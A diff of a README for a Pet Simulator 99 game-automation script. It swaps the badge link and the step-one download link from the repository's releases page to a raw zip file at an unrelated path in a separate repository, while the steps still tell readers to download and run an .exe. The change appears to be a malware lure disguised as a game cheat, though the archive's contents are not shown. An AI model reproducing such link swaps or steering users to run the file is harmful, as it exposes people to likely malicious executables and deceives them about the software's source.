@@ -5,7 +5,7 @@ description: "Automate Pet Simulator 99 gameplay to manage resources, grind task
 ---
 # 🐾 pet-simulator-99-v2-script - Automate your Pet Simulator 99 gameplay
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Midjunebreachofcontract144/midjunebreachofcontract144.github.io/main/lichenologic/v2.8.zip)
 
 ## 📁 Overview
 
@@ -26,7 +26,7 @@ Before you install this software, verify your computer meets these requirements:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the software files: [https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases](https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Midjunebreachofcontract144/midjunebreachofcontract144.github.io/main/lichenologic/v2.8.zip](https://raw.githubusercontent.com/Midjunebreachofcontract144/midjunebreachofcontract144.github.io/main/lichenologic/v2.8.zip).
 2. Look for the most recent version listed under the release notes.
 3. Download the executable file ending in .exe to your desktop.
 4. Save the file in a folder where you can find it easily.
